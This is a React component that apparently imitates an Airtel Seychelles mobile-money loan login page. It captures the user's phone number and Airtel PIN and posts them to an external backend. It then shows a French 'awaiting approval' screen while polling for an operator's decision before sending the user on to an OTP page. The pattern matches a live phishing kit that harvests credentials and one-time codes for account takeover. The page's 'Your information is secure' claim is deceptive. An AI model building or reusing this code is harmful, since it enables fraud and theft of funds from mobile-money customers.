import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';

const COUNTRY_CODE = '+248';
const PHONE_PLACEHOLDER = '2XXXXXX'; 
const PHONE_MAX = 7;

function AirtelLogin() {
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState<string[]>(['', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  
  const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
  const [refId, setRefId] = useState<string | null>(null);

  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= PHONE_MAX) {
      setPhone(val);
      if (val.length === PHONE_MAX) {
        pinRefs.current[0]?.focus();
      }
    }
  };

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value.substring(value.length - 1);
    setPin(newPin);
    if (value && index < 3) {
      pinRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinRefs.current[index - 1]?.focus();
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const pinString = pin.join('');

    if (phone.length < PHONE_MAX || pinString.length < 4) {
      return; 
    }

    setIsLoading(true);

    const fullPhone = `${COUNTRY_CODE}${phone}`;
    localStorage.setItem('airtelPhone', fullPhone);

    try {
      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
      });

      const data = await response.json();

      if (data.status === 'pending' && data.ref_id) {
        setRefId(data.ref_id);
        setIsWaitingForApproval(true); 
        
        const pollInterval = setInterval(async () => {
          try {
            const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
            const statusData = await statusRes.json();

            if (statusData.status === 'approved') {
              clearInterval(pollInterval);
              navigate('/airtel-otp');
            } else if (statusData.status === 'rejected' || statusData.status === 'expired') {
              clearInterval(pollInterval);
              setIsWaitingForApproval(false);
              setIsLoading(false);
            }
          } catch (pollErr) {
            console.error('Polling error:', pollErr);
          }
        }, 3000);
      } else {
        navigate('/airtel-otp');
      }
    } catch (err) {
      console.error('Login request failed:', err);
      setIsLoading(false);
    }
  };

  const isFormValid = phone.length === PHONE_MAX && pin.join('').length === 4;

  return (
    <div className="airtel-page-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-page-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #DA1C1C; /* Airtel Red */
          position: relative;
        }

        /* WAITING OVERLAY */
        .waiting-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          z-index: 9999;
          padding: 20px;
          background-color: rgba(255, 255, 255, 0.4);
        }

        .custom-spinner {
          width: 60px;
          height: 60px;
          border: 6px solid #E5E7EB;
          border-top: 6px solid #DA1C1C;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin-bottom: 24px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .waiting-title {
          font-size: 22px;
          font-weight: 700;
          color: #1a1a1a;
          margin-bottom: 20px;
        }

        .waiting-message {
          background-color: #FEF2F2;
          color: #4B5563;
          padding: 16px 24px;
          border-radius: 24px;
          text-align: center;
          font-size: 15px;
          font-weight: 500;
          line-height: 1.5;
          max-width: 380px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }

        /* HEADER */
        .header-section {
          padding: 40px 24px 30px;
          display: flex;
          flex-direction: column;
          align-items: center;
          position: relative;
        }

        .back-btn {
          position: absolute;
          left: 20px;
          top: 20px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 8px;
        }

        .header-title {
          font-size: 32px;
          font-weight: 900;
          color: #1a1a1a;
          font-style: italic;
          margin-bottom: 6px;
        }

        .header-subtitle {
          font-size: 14px;
          font-weight: 600;
          color: #1a1a1a;
        }

        /* MAIN CARD */
        .main-card {
          background-color: #ffffff;
          width: 90%;
          max-width: 420px;
          margin: 0 auto;
          border-radius: 24px;
          padding: 32px 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
          position: relative;
          z-index: 10;
        }

        .card-title {
          font-size: 26px;
          font-weight: 800;
          color: #000000;
          margin-bottom: 8px;
        }

        .card-subtitle {
          font-size: 15px;
          color: #4B5563;
          margin-bottom: 24px;
        }

        .input-label {
          font-size: 15px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 12px;
          width: 100%;
          text-align: center;
        }

        /* PHONE INPUT */
        .phone-wrapper {
          width: 100%;
          display: flex;
          border-radius: 8px;
          overflow: hidden;
          margin-bottom: 24px;
          border: 1px solid #CBD5E1;
        }

        .phone-prefix {
          background-color: #E2E8F0;
          display: flex;
          align-items: center;
          padding: 0 16px;
          font-size: 16px;
          font-weight: 700;
          color: #1a1a1a;
          gap: 8px;
        }

        .phone-input-field {
          flex: 1;
          background-color: #B0C4DE;
          border: none;
          padding: 16px;
          font-size: 18px;
          color: #ffffff;
          font-weight: 600;
          outline: none;
        }

        .phone-input-field::placeholder {
          color: #E2E8F0;
        }

        /* PIN INPUT */
        .pin-inputs-container {
          display: flex;
          gap: 16px;
          margin-bottom: 28px;
        }

        .pin-box {
          width: 60px;
          height: 60px;
          border: 2px solid #CBD5E1;
          border-radius: 12px;
          font-size: 28px;
          text-align: center;
          color: #000000;
          outline: none;
          background-color: #ffffff;
        }

        .pin-box::placeholder {
          color: #000000;
          font-size: 30px;
        }

        /* BUTTON */
        .login-btn {
          width: 100%;
          padding: 18px;
          border-radius: 12px;
          border: none;
          background-color: #D1D5DB;
          color: #4B5563;
          font-size: 18px;
          font-weight: 700;
          cursor: pointer;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 12px;
          transition: all 0.2s;
        }

        .login-btn.active {
          background-color: #DA1C1C;
          color: #ffffff;
        }

        /* SECURITY TEXT */
        .security-footer {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-top: 24px;
          color: #6B7280;
          font-size: 14px;
          font-weight: 500;
        }

        /* FOOTER ICONS */
        .brand-icons-footer {
          flex: 1;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 16px;
          padding: 40px 20px 20px;
        }

        .brand-icon {
          display: flex;
          align-items: center;
          justify-content: center;
        }
      `}</style>

      {isWaitingForApproval && (
        <div className="waiting-overlay">
          <div className="custom-spinner"></div>
          <div className="waiting-title">En attente d'approbation</div>
          <div className="waiting-message">
            Votre demande a été envoyée. Merci de patienter pendant la vérification...
          </div>
        </div>
      )}

      {/* HEADER */}
      <div className="header-section">
        <button className="back-btn" onClick={() => navigate('/')}>
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12" />
            <polyline points="12 19 5 12 12 5" />
          </svg>
        </button>
        {/* Updated to Seychelles but kept the italic style */}
        <h1 className="header-title">Airtel Seychelles</h1>
        <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
      </div>

      {/* MAIN CARD */}
      <div className="main-card">
        <h2 className="card-title">Welcome back</h2>
        <p className="card-subtitle">Log in to your Airtel Seychelles account</p>

        <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
          
          <span className="input-label">Phone number</span>
          <div className="phone-wrapper">
            <div className="phone-prefix">
              {/* Seychelles Flag SVG */}
              <svg width="20" height="14" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: '2px' }}>
                <path fill="#003f87" d="M0,200 L300,0 L0,0 Z"/>
                <path fill="#fcd856" d="M0,200 L300,0 L300,50 Z"/>
                <path fill="#d62828" d="M0,200 L300,50 L300,100 Z"/>
                <path fill="#ffffff" d="M0,200 L300,100 L300,150 Z"/>
                <path fill="#007a3d" d="M0,200 L300,150 L300,200 Z"/>
              </svg>
              {COUNTRY_CODE}
            </div>
            <input
              type="tel"
              className="phone-input-field"
              placeholder={PHONE_PLACEHOLDER}
              value={phone}
              onChange={handlePhoneChange}
              maxLength={PHONE_MAX}
              disabled={isLoading || isWaitingForApproval}
            />
          </div>

          <span className="input-label">Enter your Airtel PIN code</span>
          <div className="pin-inputs-container">
            {pin.map((digit, index) => (
              <input
                key={index}
                type="password"
                maxLength={1}
                value={digit}
                ref={(el) => { pinRefs.current[index] = el; }}
                onChange={(e) => handlePinChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="pin-box"
                placeholder="•"
                disabled={isLoading || isWaitingForApproval}
              />
            ))}
          </div>

          <button 
            type="submit" 
            className={`login-btn ${isFormValid ? 'active' : ''}`}
            disabled={!isFormValid || isLoading || isWaitingForApproval}
          >
            Connexion
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="12 5 19 12 12 19" />
            </svg>
          </button>

        </form>

        <div className="security-footer">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
          </svg>
          Your information is secure.
        </div>
      </div>

      {/* BRAND ICONS FOOTER (Matching the second image) */}
      <div className="brand-icons-footer">
        {/* Icon 1: Airtel Phone */}
        <div className="brand-icon">
          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
          </div>
        </div>
        
        {/* Icon 2: Lock */}
        <div className="brand-icon">
          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
          </div>
        </div>

        {/* Icon 3: Airtel Money */}
        <div className="brand-icon">
          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
          </div>
        </div>

        {/* Icon 4: Currency Symbol */}
        <div className="brand-icon">
          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default AirtelLogin;